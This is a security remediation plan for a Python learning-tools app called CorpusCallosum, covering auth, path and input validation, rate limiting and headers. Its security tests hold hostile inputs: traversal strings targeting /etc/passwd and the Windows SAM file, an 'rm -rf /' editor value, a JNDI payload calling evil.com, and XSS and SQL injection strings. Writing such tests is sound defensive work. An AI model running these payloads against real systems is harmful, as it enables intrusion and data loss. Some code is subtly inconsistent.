# CorpusCallosum Security Hardening Plan
**Date**: April 7, 2026  
**Plan Type**: Security Remediation & System Hardening  
**Target Version**: 0.7.0  
**Priority**: High (Security Critical)

---

## Executive Summary

This plan addresses the 16 security vulnerabilities identified in the security audit, implements secure environment variable management for non-technical users, refines dependency management through conda-forge channels, replaces argparse with more elegant CLI libraries, and establishes comprehensive security practices.

### Key Objectives
1. **Immediate Security Fixes** - Resolve 3 high-severity vulnerabilities
2. **Secure Configuration Management** - Move hardcoded values to config dataclasses
3. **Simple Environment Management** - User-friendly secrets handling
4. **Dependency Audit & Refinement** - Conda-forge priority, minimal imports
5. **Enhanced CLI Experience** - Replace argparse with modern alternatives
6. **Structured Logging** - Configurable verbose logging system
7. **Directory Restructure** - Flatten src structure (src/corpus_callosum → src/)

---

## Phase 1: Critical Security Fixes (Week 1)

### 1.1 Command Injection Prevention
**Priority**: Critical  
**Files**: `src/tools/video/augment.py`

#### Configuration Integration
```python
# Add to src/config/base.py
@dataclass
class VideoConfig:
    allowed_editors: list[str] = field(default_factory=lambda: [
        "nano", "vim", "code", "notepad.exe", "gedit", "subl"
    ])
    default_editor: str = "xdg-open"
    enable_auto_open: bool = True
    file_size_limit: int = 100 * 1024 * 1024  # 100MB
```

#### Secure Implementation
```python
# Update src/tools/video/augment.py
import shlex
from src.config import VideoConfig
from src.utils.security import validate_file_path

def safe_open_file(file_path: Path, config: VideoConfig) -> None:
    """Securely open file with validated editor."""
    # Validate file path against allowed directories
    validated_path = validate_file_path(file_path, config.allowed_base_dirs)
    
    # Validate file size
    if validated_path.stat().st_size > config.file_size_limit:
        raise ValueError(f"File too large: {validated_path}")
    
    # Get and validate editor
    editor = os.environ.get("EDITOR", config.default_editor)
    if editor not in config.allowed_editors:
        logger.warning(f"Editor '{editor}' not in allowlist, using default")
        editor = config.default_editor
    
    # Execute with proper escaping
    subprocess.run([editor, str(validated_path)], check=False)
```

### 1.2 Authentication & Authorization System
**Priority**: Critical  
**Files**: `src/mcp_server/`, `src/auth/`

#### New Authentication Module
```python
# Create src/auth/config.py
@dataclass
class AuthConfig:
    enabled: bool = True
    jwt_secret_key: str = ""  # Will use secure env management
    jwt_algorithm: str = "HS256"
    access_token_expire_minutes: int = 30
    require_https: bool = True
    rate_limit_requests: int = 100
    rate_limit_window: int = 3600  # 1 hour
    admin_users: list[str] = field(default_factory=list)

# Create src/auth/manager.py
from pydantic import BaseModel, field_validator
import jwt
from datetime import datetime, timedelta

class AuthManager:
    def __init__(self, config: AuthConfig, secure_env: SecureEnvironment):
        self.config = config
        self.secret_key = secure_env.get_secret("JWT_SECRET_KEY")
        
    async def verify_token(self, token: str) -> dict:
        """Verify JWT token and return user data."""
        try:
            payload = jwt.decode(
                token, 
                self.secret_key, 
                algorithms=[self.config.jwt_algorithm]
            )
            return payload
        except jwt.ExpiredSignatureError:
            raise HTTPException(401, "Token expired")
        except jwt.InvalidTokenError:
            raise HTTPException(401, "Invalid token")
```

### 1.3 Path Traversal Protection
**Priority**: Critical  
**Files**: `src/corpus_callosum/utils/security.py`

#### Centralized Security Utilities
```python
# Create src/corpus_callosum/utils/security.py
@dataclass
class SecurityConfig:
    allowed_base_dirs: list[Path] = field(default_factory=lambda: [
        Path("./vault"),
        Path("./uploads"), 
        Path("./output"),
        Path("./scratch")
    ])
    max_file_size: int = 100 * 1024 * 1024  # 100MB
    allowed_extensions: set[str] = field(default_factory=lambda: {
        '.pdf', '.txt', '.md', '.docx', '.html', '.rtf'
    })
    blocked_patterns: list[str] = field(default_factory=lambda: [
        '..', '~/', '/etc/', '/usr/', '/var/', 'C:\\Windows', 'C:\\Program Files'
    ])

def validate_file_path(user_path: str, security_config: SecurityConfig) -> Path:
    """Comprehensive file path validation."""
    # Check for blocked patterns
    for pattern in security_config.blocked_patterns:
        if pattern in user_path:
            raise ValueError(f"Blocked pattern detected: {pattern}")
    
    try:
        resolved_path = Path(user_path).expanduser().resolve()
    except (OSError, ValueError) as e:
        raise ValueError(f"Invalid path: {user_path}") from e
    
    # Validate against allowed directories
    for allowed_dir in security_config.allowed_base_dirs:
        try:
            resolved_path.relative_to(allowed_dir.resolve())
            return resolved_path
        except ValueError:
            continue
    
    raise ValueError(f"Path not in allowed directories: {user_path}")
```

---

## Phase 2: Secure Environment Management (Week 1-2)

### 2.1 User-Friendly Secrets Management
**Priority**: High  
**Goal**: Simple, secure environment variable handling for non-technical users

#### Secure Environment System
```python
# Create src/corpus_callosum/config/secrets.py
from pathlib import Path
import keyring
from cryptography.fernet import Fernet
import getpass
from typing import Optional

@dataclass
class SecretConfig:
    use_system_keyring: bool = True
    secrets_file: Optional[Path] = None
    require_encryption: bool = True
    auto_generate_keys: bool = True

class SecureEnvironment:
    """User-friendly secure environment variable management."""
    
    def __init__(self, config: SecretConfig):
        self.config = config
        self.service_name = "corpus_callosum"
    
    def setup_interactive(self) -> None:
        """Interactive setup for non-technical users."""
        print("🔐 CorpusCallosum Security Setup")
        print("Let's configure your API keys and secrets securely.")
        
        # Auto-detect required secrets
        required_secrets = self._detect_required_secrets()
        
        for secret_name, description in required_secrets.items():
            self._prompt_for_secret(secret_name, description)
    
    def _prompt_for_secret(self, name: str, description: str) -> None:
        """Securely prompt user for secret."""
        print(f"\n📋 {description}")
        
        if self.has_secret(name):
            update = input(f"Secret '{name}' already exists. Update? (y/N): ")
            if update.lower() != 'y':
                return
        
        # Secure password input
        value = getpass.getpass(f"Enter {name}: ")
        if value:
            self.set_secret(name, value)
            print(f"✅ {name} saved securely")
    
    def get_secret(self, name: str) -> str:
        """Retrieve secret from secure storage."""
        if self.config.use_system_keyring:
            value = keyring.get_password(self.service_name, name)
            if value:
                return value
        
        # Fallback to encrypted file
        return self._get_from_encrypted_file(name)
    
    def set_secret(self, name: str, value: str) -> None:
        """Store secret securely."""
        if self.config.use_system_keyring:
            keyring.set_password(self.service_name, name, value)
        else:
            self._store_in_encrypted_file(name, value)
```

#### Simple CLI Setup Command
```python
# Update CLI tools to include setup
# Using Typer instead of argparse for cleaner API
import typer
from rich.console import Console
from rich.panel import Panel

app = typer.Typer(rich_markup_mode="rich")
console = Console()

@app.command("setup")
def setup_secrets():
    """🔐 Interactive setup for API keys and secrets."""
    console.print(Panel(
        "[bold blue]CorpusCallosum Security Setup[/bold blue]\n"
        "This wizard will help you configure API keys securely.",
        title="🔐 Security Setup"
    ))
    
    secure_env = SecureEnvironment(SecretConfig())
    secure_env.setup_interactive()
    
    console.print("\n✅ [bold green]Setup complete![/bold green]")
    console.print("Your secrets are stored securely in your system keyring.")
```

### 2.2 Configuration Dataclass Migration
**Priority**: Medium  
**Goal**: Move all hardcoded values to configuration dataclasses

#### Audit & Migration Plan
- [ ] **Video Configuration** - Editor lists, file limits, processing settings
- [ ] **Security Configuration** - Allowed paths, file types, size limits
- [ ] **Authentication Configuration** - JWT settings, rate limits, permissions
- [ ] **Logging Configuration** - Levels, formatters, outputs
- [ ] **Network Configuration** - CORS origins, allowed hosts, timeouts
- [ ] **Processing Limits** - Chunk sizes, query limits, batch sizes

```python
# Enhanced base.py with all configurations
@dataclass
class NetworkConfig:
    cors_origins: list[str] = field(default_factory=lambda: ["http://localhost:3000"])
    cors_methods: list[str] = field(default_factory=lambda: ["GET", "POST"])
    cors_headers: list[str] = field(default_factory=lambda: ["Authorization", "Content-Type"])
    trusted_hosts: list[str] = field(default_factory=lambda: ["localhost", "127.0.0.1"])
    request_timeout: int = 30
    max_request_size: int = 10 * 1024 * 1024  # 10MB

@dataclass
class ProcessingConfig:
    max_chunk_size: int = 2000
    min_chunk_size: int = 100
    max_chunks_per_query: int = 20
    batch_size: int = 1000
    max_query_length: int = 10000
    max_collection_name_length: int = 100
```

---

## Phase 3: Dependency Audit & Refinement (Week 2)

### 3.1 Conda-Forge Dependency Strategy
**Priority**: Medium  
**Goal**: Prioritize conda-forge packages, audit all imports

#### Approved Dependency Channels
1. **Primary**: conda-forge
2. **Secondary**: PyPI (with justification)
3. **Blocked**: Direct GitHub, unofficial channels

#### Core Dependencies Audit
```yaml
# New environment.yml for conda-forge priority
name: corpus-callosum
channels:
  - conda-forge
  - defaults
dependencies:
  - python=3.11
  - fastapi=0.104.*  # Available on conda-forge
  - pydantic=2.*     # Available on conda-forge
  - click=8.*        # Available on conda-forge
  - typer=0.9.*      # Available on conda-forge (replaces argparse)
  - rich=13.*        # Beautiful CLI output
  - structlog=23.*   # Structured logging
  - cryptography=41.* # Secure encryption
  - keyring=24.*     # System keyring access
  - httpx=0.25.*     # HTTP client
  - pyyaml=6.*       # YAML processing
  - pathlib          # Built-in (Python 3.4+)
  - pip              # For packages not in conda-forge
  - pip:
    - chromadb==0.4.24     # Vector database (PyPI only)
    - fastmcp==0.3.*       # MCP implementation (PyPI only)
    - sentence-transformers==2.2.*  # Embeddings (PyPI only)
```

#### Import Refinement Strategy
```python
# Create src/corpus_callosum/utils/imports.py
"""Centralized import management with security auditing."""

# Standard library imports (minimal, specific)
from pathlib import Path
from typing import Dict, List, Optional, Union, Any
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from functools import lru_cache
import logging
import os
import sys
from collections.abc import Callable

# Third-party imports (audited, conda-forge preferred)
from pydantic import BaseModel, field_validator, ConfigDict
from fastapi import FastAPI, HTTPException, Depends, Header, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.middleware.trustedhost import TrustedHostMiddleware
import typer
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
import structlog
import httpx
import yaml

# Avoid broad imports like "from module import *"
# Avoid importing entire modules when only specific functions needed
# Example of refined import:
# OLD: import subprocess
# NEW: from subprocess import run, PIPE, CalledProcessError
```

### 3.2 Import Security Audit
**Priority**: Medium

#### Dependency Justification Matrix
| Package | Channel | Justification | Security Rating | Alternatives |
|---------|---------|---------------|-----------------|-------------|
| fastapi | conda-forge | Web framework, well-maintained | ✅ High | flask, starlette |
| pydantic | conda-forge | Data validation, type safety | ✅ High | attrs, dataclasses |
| typer | conda-forge | Modern CLI framework | ✅ High | click, argparse |
| chromadb | PyPI only | Vector database core requirement | ⚠️ Medium | pinecone, weaviate |
| sentence-transformers | PyPI only | Embeddings, ML requirement | ⚠️ Medium | openai-embeddings |

---

## Phase 4: Modern CLI Architecture (Week 2-3)

### 4.1 Replace Argparse with Typer
**Priority**: Medium  
**Goal**: Elegant, type-safe CLI with better UX

#### Typer Migration Strategy
```python
# New src/corpus_callosum/cli/base.py
import typer
from rich.console import Console
from rich.table import Table
from rich.progress import track
from typing_extensions import Annotated

# Type-safe CLI with rich output
app = typer.Typer(
    name="corpus",
    help="🧠 CorpusCallosum - AI-Powered Learning Tools",
    rich_markup_mode="rich",
    no_args_is_help=True
)

console = Console()

# Modern CLI patterns
@app.command("rag")
def rag_command(
    action: Annotated[str, typer.Argument(help="Action: ingest, query, chat")],
    collection: Annotated[str, typer.Option("--collection", "-c", help="Collection name")] = None,
    path: Annotated[str, typer.Option("--path", "-p", help="Document path")] = None,
    query: Annotated[str, typer.Option("--query", "-q", help="Search query")] = None,
    config: Annotated[str, typer.Option("--config", "-f", help="Config file")] = "configs/base.yaml",
    verbose: Annotated[bool, typer.Option("--verbose", "-v", help="Verbose output")] = False
):
    """🔍 RAG operations: ingest documents, query knowledge base."""
    
    # Setup logging based on verbose flag
    setup_logging(verbose)
    
    # Dispatch to appropriate handler
    if action == "ingest":
        handle_rag_ingest(collection, path, config)
    elif action == "query":
        handle_rag_query(collection, query, config)
    elif action == "chat":
        handle_rag_chat(collection, config)
    else:
        console.print(f"[red]Unknown action: {action}[/red]")
        raise typer.Exit(1)
```

#### Enhanced User Experience
```python
# Rich progress bars and status
def handle_rag_ingest(collection: str, path: str, config: str):
    """Enhanced ingest with progress tracking."""
    
    console.print(f"🔄 [bold]Ingesting documents into '{collection}'[/bold]")
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        
        task = progress.add_task("Scanning files...", total=None)
        files = list(Path(path).rglob("*.pdf"))
        progress.update(task, description=f"Found {len(files)} files")
        
        progress.remove_task(task)
        
        # Process files with progress bar
        for file_path in track(files, description="Processing documents..."):
            # Process each file
            pass
    
    console.print("✅ [bold green]Ingestion complete![/bold green]")
```

### 4.2 Unified CLI Architecture
**Priority**: Medium

#### Single Entry Point Design
```python
# src/corpus_callosum/cli/main.py
from typer import Typer
from .commands import rag, flashcards, summaries, quizzes, video, db, setup

app = Typer(name="corpus", help="🧠 CorpusCallosum Learning Tools")

# Register sub-commands
app.add_typer(rag.app, name="rag", help="🔍 RAG operations")
app.add_typer(flashcards.app, name="flashcards", help="🃏 Generate flashcards")
app.add_typer(summaries.app, name="summaries", help="📝 Generate summaries") 
app.add_typer(quizzes.app, name="quizzes", help="❓ Generate quizzes")
app.add_typer(video.app, name="video", help="🎥 Video processing")
app.add_typer(db.app, name="db", help="🗄️ Database management")
app.add_typer(setup.app, name="setup", help="⚙️ System setup")

# Global options and configuration
@app.callback()
def main(
    verbose: bool = typer.Option(False, "--verbose", "-v", help="Enable verbose logging"),
    config: str = typer.Option("configs/base.yaml", "--config", "-c", help="Configuration file")
):
    """🧠 CorpusCallosum - AI-Powered Learning and Knowledge Management"""
    setup_global_config(verbose, config)
```

---

## Phase 5: Structured Logging System (Week 3)

### 5.1 Configurable Logging Architecture
**Priority**: Medium  
**Goal**: Rich, structured, toggleable logging

#### Logging Configuration
```python
# Add to src/corpus_callosum/config/base.py
@dataclass
class LoggingConfig:
    level: str = "INFO"
    format: str = "structured"  # structured | json | plain
    enable_file_logging: bool = True
    log_file: Path = field(default_factory=lambda: Path("./logs/corpus.log"))
    enable_security_logging: bool = True
    security_log_file: Path = field(default_factory=lambda: Path("./logs/security.log"))
    max_log_size: int = 10 * 1024 * 1024  # 10MB
    backup_count: int = 5
    structured_logger: bool = True
    
    # Development settings
    show_timestamps: bool = True
    show_levels: bool = True
    show_module_names: bool = True
    colorize_output: bool = True

# Enhanced logging setup
import structlog
from rich.logging import RichHandler
import logging.handlers

def setup_logging(config: LoggingConfig, verbose: bool = False) -> None:
    """Setup comprehensive logging system."""
    
    # Determine log level
    level = "DEBUG" if verbose else config.level
    
    # Configure structlog for structured logging
    structlog.configure(
        processors=[
            structlog.contextvars.merge_contextvars,
            structlog.processors.add_log_level,
            structlog.processors.TimeStamper(fmt="ISO"),
            structlog.dev.ConsoleRenderer() if config.colorize_output else structlog.processors.JSONRenderer()
        ],
        wrapper_class=structlog.make_filtering_bound_logger(
            logging.getLevelName(level)
        ),
        logger_factory=structlog.WriteLoggerFactory(),
        cache_logger_on_first_use=True
    )
    
    # Rich console handler for beautiful output
    if config.colorize_output:
        console_handler = RichHandler(
            rich_tracebacks=True,
            show_time=config.show_timestamps,
            show_level=config.show_levels,
            show_path=config.show_module_names
        )
    else:
        console_handler = logging.StreamHandler()
    
    # File handler with rotation
    if config.enable_file_logging:
        file_handler = logging.handlers.RotatingFileHandler(
            config.log_file,
            maxBytes=config.max_log_size,
            backupCount=config.backup_count
        )
        file_handler.setFormatter(
            logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        )
    
    # Configure root logger
    logging.basicConfig(
        level=level,
        handlers=[console_handler] + ([file_handler] if config.enable_file_logging else []),
        format="%(message)s" if config.colorize_output else "%(asctime)s - %(levelname)s - %(message)s"
    )
```

#### Usage Patterns
```python
# Throughout the codebase
import structlog
from corpus_callosum.utils.logging import get_logger

# Get structured logger
logger = structlog.get_logger("corpus.rag.ingest")

# Structured logging with context
logger.info(
    "document_processed",
    document_path=str(doc_path),
    collection=collection_name,
    chunks_created=chunk_count,
    processing_time_ms=elapsed_time,
    file_size_bytes=file_size
)

# Security event logging
security_logger = structlog.get_logger("security")
security_logger.warning(
    "authentication_failed",
    user_id=user_id,
    client_ip=request.client.host,
    reason="invalid_token",
    timestamp=datetime.utcnow().isoformat()
)
```

---

## Phase 6: Input Validation & Rate Limiting (Week 3-4)

### 6.1 Comprehensive Input Validation
**Priority**: High  
**Goal**: Pydantic-based validation for all user inputs

#### Validation Models
```python
# Create src/corpus_callosum/validation/models.py
from pydantic import BaseModel, field_validator, Field
from typing import Optional, List
from pathlib import Path

class CollectionRequest(BaseModel):
    """Validation for collection operations."""
    name: str = Field(..., min_length=1, max_length=100, pattern=r'^[a-zA-Z0-9_-]+$')
    
    @field_validator('name')
    @classmethod
    def validate_collection_name(cls, v: str) -> str:
        if v.startswith('_') or v.startswith('-'):
            raise ValueError('Collection name cannot start with _ or -')
        return v.lower()

class RAGIngestRequest(BaseModel):
    """Validation for RAG ingestion."""
    path: Path = Field(..., description="Path to documents")
    collection: str = Field(..., min_length=1, max_length=100)
    chunk_size: Optional[int] = Field(500, ge=100, le=4000)
    chunk_overlap: Optional[int] = Field(50, ge=0, le=500)
    
    @field_validator('path')
    @classmethod
    def validate_path_exists(cls, v: Path) -> Path:
        if not v.exists():
            raise ValueError(f'Path does not exist: {v}')
        return v
    
    @field_validator('chunk_overlap')
    @classmethod
    def validate_overlap_vs_size(cls, v: int, values: dict) -> int:
        if 'chunk_size' in values and v >= values['chunk_size']:
            raise ValueError('Chunk overlap must be less than chunk size')
        return v

class RAGQueryRequest(BaseModel):
    """Validation for RAG queries."""
    collection: str = Field(..., min_length=1, max_length=100)
    query: str = Field(..., min_length=1, max_length=10000)
    top_k: Optional[int] = Field(5, ge=1, le=50)
    
    @field_validator('query')
    @classmethod
    def validate_query_content(cls, v: str) -> str:
        # Check for potential injection patterns
        blocked_patterns = ['<script>', '{{', '}}', '${', '$(']
        for pattern in blocked_patterns:
            if pattern in v.lower():
                raise ValueError(f'Query contains blocked pattern: {pattern}')
        return v.strip()
```

### 6.2 Rate Limiting Implementation
**Priority**: High  
**Goal**: Prevent DoS attacks and resource exhaustion

```python
# Create src/corpus_callosum/middleware/rate_limit.py
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded
from slowapi.middleware import SlowAPIMiddleware
from fastapi import Request
import redis
from typing import Optional

@dataclass
class RateLimitConfig:
    enabled: bool = True
    storage_backend: str = "memory"  # memory | redis
    redis_url: Optional[str] = None
    default_limits: List[str] = field(default_factory=lambda: [
        "100/hour",   # General API usage
        "1000/day"    # Daily limit
    ])
    endpoint_limits: Dict[str, List[str]] = field(default_factory=lambda: {
        "rag_query": ["10/minute", "100/hour"],
        "rag_ingest": ["5/hour", "20/day"],
        "generate_flashcards": ["20/hour", "100/day"],
        "transcribe_video": ["2/hour", "10/day"]  # Resource intensive
    })

def create_limiter(config: RateLimitConfig) -> Limiter:
    """Create rate limiter with appropriate backend."""
    
    if config.storage_backend == "redis" and config.redis_url:
        # Redis backend for production
        import redis
        redis_client = redis.from_url(config.redis_url)
        return Limiter(
            key_func=get_remote_address,
            storage_uri=config.redis_url
        )
    else:
        # In-memory backend for development
        return Limiter(key_func=get_remote_address)

# Apply to FastAPI app
def setup_rate_limiting(app: FastAPI, config: RateLimitConfig) -> None:
    """Setup rate limiting middleware."""
    if not config.enabled:
        return
    
    limiter = create_limiter(config)
    app.state.limiter = limiter
    app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
    app.add_middleware(SlowAPIMiddleware)
```

---

## Phase 7: Security Headers & Network Hardening (Week 4)

### 7.1 Comprehensive Security Middleware
**Priority**: High  
**Goal**: Prevent web-based attacks

```python
# Create src/corpus_callosum/middleware/security.py
from fastapi import FastAPI, Request, Response
from fastapi.middleware.cors import CORSMiddleware
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware
from starlette.middleware.sessions import SessionMiddleware
import secrets

def setup_security_middleware(app: FastAPI, config: NetworkConfig) -> None:
    """Setup comprehensive security middleware."""
    
    # HTTPS redirect (production)
    if config.require_https:
        app.add_middleware(HTTPSRedirectMiddleware)
    
    # Trusted host protection
    app.add_middleware(
        TrustedHostMiddleware,
        allowed_hosts=config.trusted_hosts
    )
    
    # CORS with strict configuration
    app.add_middleware(
        CORSMiddleware,
        allow_origins=config.cors_origins,
        allow_credentials=True,
        allow_methods=config.cors_methods,
        allow_headers=config.cors_headers,
        max_age=3600
    )
    
    # Session middleware (for auth)
    app.add_middleware(
        SessionMiddleware,
        secret_key=secrets.token_hex(32),
        max_age=1800  # 30 minutes
    )
    
    # Custom security headers
    @app.middleware("http")
    async def security_headers(request: Request, call_next):
        response = await call_next(request)
        
        # Security headers
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-XSS-Protection"] = "1; mode=block"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
        
        # HSTS (production only)
        if config.require_https:
            response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains; preload"
        
        # CSP (restrictive)
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data:; "
            "connect-src 'self'"
        )
        
        return response
```

---

## Phase 8: Testing & Validation (Week 4-5)

### 8.1 Security Testing Framework
**Priority**: High

#### Automated Security Tests
```python
# Create tests/security/test_vulnerabilities.py
import pytest
from fastapi.testclient import TestClient
from corpus_callosum.main import create_app
import tempfile
from pathlib import Path

class TestSecurityVulnerabilities:
    """Test suite for security vulnerabilities."""
    
    def test_path_traversal_prevention(self):
        """Test path traversal attacks are blocked."""
        client = TestClient(create_app())
        
        # Test directory traversal attempts
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "....//....//....//etc//passwd"
        ]
        
        for path in malicious_paths:
            response = client.post("/rag/ingest", json={
                "path": path,
                "collection": "test"
            })
            assert response.status_code in [400, 422], f"Path traversal not blocked: {path}"
    
    def test_command_injection_prevention(self):
        """Test command injection is prevented."""
        # Test malicious editor environment variable
        import os
        original_editor = os.environ.get("EDITOR")
        
        try:
            os.environ["EDITOR"] = "rm -rf / #"
            # Test video augmentation doesn't execute malicious command
            # This should be blocked by the allowlist
            pass  # Implementation depends on refactored code
        finally:
            if original_editor:
                os.environ["EDITOR"] = original_editor
            elif "EDITOR" in os.environ:
                del os.environ["EDITOR"]
    
    def test_input_validation(self):
        """Test input validation prevents malicious inputs."""
        client = TestClient(create_app())
        
        # Test oversized inputs
        large_query = "A" * 20000  # Exceeds 10k limit
        response = client.post("/rag/query", json={
            "collection": "test",
            "query": large_query
        })
        assert response.status_code == 422
        
        # Test injection patterns
        injection_queries = [
            "<script>alert('xss')</script>",
            "{{7*7}}",
            "${jndi:ldap://evil.com/}",
            "'; DROP TABLE collections; --"
        ]
        
        for query in injection_queries:
            response = client.post("/rag/query", json={
                "collection": "test", 
                "query": query
            })
            assert response.status_code == 422, f"Injection not blocked: {query}"

# Create tests/security/test_authentication.py  
class TestAuthentication:
    """Test authentication and authorization."""
    
    def test_unauthenticated_requests_blocked(self):
        """Test unauthenticated requests are rejected."""
        client = TestClient(create_app())
        
        protected_endpoints = [
            "/rag/query",
            "/rag/ingest", 
            "/generate/flashcards",
            "/collections"
        ]
        
        for endpoint in protected_endpoints:
            response = client.post(endpoint)
            assert response.status_code == 401
    
    def test_invalid_tokens_rejected(self):
        """Test invalid JWT tokens are rejected."""
        client = TestClient(create_app())
        
        invalid_tokens = [
            "invalid.token.here",
            "Bearer invalid",
            "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid",
            ""
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": token}
            response = client.post("/rag/query", headers=headers)
            assert response.status_code == 401
```

### 8.2 Performance & Load Testing
```python
# Create tests/performance/test_rate_limiting.py
import pytest
import asyncio
from fastapi.testclient import TestClient

class TestRateLimiting:
    """Test rate limiting functionality."""
    
    def test_rate_limit_enforcement(self):
        """Test rate limits are enforced."""
        client = TestClient(create_app())
        
        # Simulate rapid requests
        responses = []
        for i in range(15):  # Exceed 10/minute limit
            response = client.post("/rag/query", json={
                "collection": "test",
                "query": "test query"
            })
            responses.append(response.status_code)
        
        # Should start getting 429 responses
        assert 429 in responses, "Rate limiting not enforced"
    
    def test_rate_limit_per_endpoint(self):
        """Test different endpoints have different limits."""
        client = TestClient(create_app())
        
        # Video transcription should have stricter limits
        responses = []
        for i in range(5):
            response = client.post("/video/transcribe", json={
                "video_path": "test.mp4",
                "collection": "test"
            })
            responses.append(response.status_code)
        
        assert 429 in responses, "Video endpoint rate limiting not enforced"
```

---

## Implementation Timeline

### Week 1: Critical Security Fixes
- [ ] Fix command injection vulnerability
- [ ] Implement authentication system  
- [ ] Add path traversal protection
- [ ] Setup secure environment management

### Week 2: Configuration & Dependencies
- [ ] Migrate hardcoded values to config dataclasses
- [ ] Audit dependencies for conda-forge availability
- [ ] Refine imports to minimal necessary
- [ ] Replace argparse with Typer

### Week 3: Logging & Validation
- [ ] Implement structured logging system
- [ ] Add comprehensive input validation
- [ ] Setup rate limiting middleware
- [ ] Configure security headers

### Week 4: Testing & Documentation
- [ ] Write security test suite
- [ ] Performance and load testing
- [ ] Update documentation for new features
- [ ] Security audit re-validation

### Week 5: Deployment & Monitoring
- [ ] Production deployment configuration
- [ ] Security monitoring setup
- [ ] Incident response procedures
- [ ] Final security verification

---

## Success Metrics

### Security Metrics
- [ ] All High severity vulnerabilities resolved
- [ ] 95%+ code coverage for security tests
- [ ] Zero hardcoded secrets or credentials
- [ ] All inputs validated through Pydantic models
- [ ] Rate limiting effective on all endpoints

### Code Quality Metrics  
- [ ] All dependencies available through conda-forge or justified
- [ ] Import statements reduced by 40%+ lines
- [ ] Configuration centralized in dataclasses
- [ ] CLI commands migrated to Typer with rich output

### User Experience Metrics
- [ ] Interactive setup wizard for non-technical users
- [ ] Structured logging with configurable verbosity
- [ ] Clear error messages without information leakage
- [ ] Performance maintained or improved

---

## Risk Mitigation

### High-Risk Items
1. **Breaking Changes**: CLI interface changes may break existing scripts
   - **Mitigation**: Maintain backward compatibility flags, provide migration guide
   
2. **Performance Impact**: Additional validation and security checks
   - **Mitigation**: Benchmark and optimize, make security features configurable

3. **Dependency Conflicts**: Moving to conda-forge may create version conflicts
   - **Mitigation**: Thorough testing, maintain PyPI fallbacks

### Medium-Risk Items
1. **User Adoption**: Interactive setup may confuse power users
   - **Mitigation**: Provide both interactive and programmatic configuration
   
2. **Logging Overhead**: Structured logging may impact performance
   - **Mitigation**: Make logging levels configurable, async logging

---

## Post-Implementation

### Monitoring & Maintenance
- [ ] Setup automated dependency scanning (safety, bandit)
- [ ] Regular security audits (quarterly)
- [ ] Performance monitoring and alerting
- [ ] User feedback collection on new CLI experience

### Continuous Improvement
- [ ] Regular review of conda-forge package availability
- [ ] CLI UX improvements based on user feedback  
- [ ] Security best practices updates
- [ ] Documentation maintenance and improvements

This plan provides a comprehensive roadmap for securing CorpusCallosum while improving developer and user experience through modern CLI design, simplified configuration management, and robust security practices.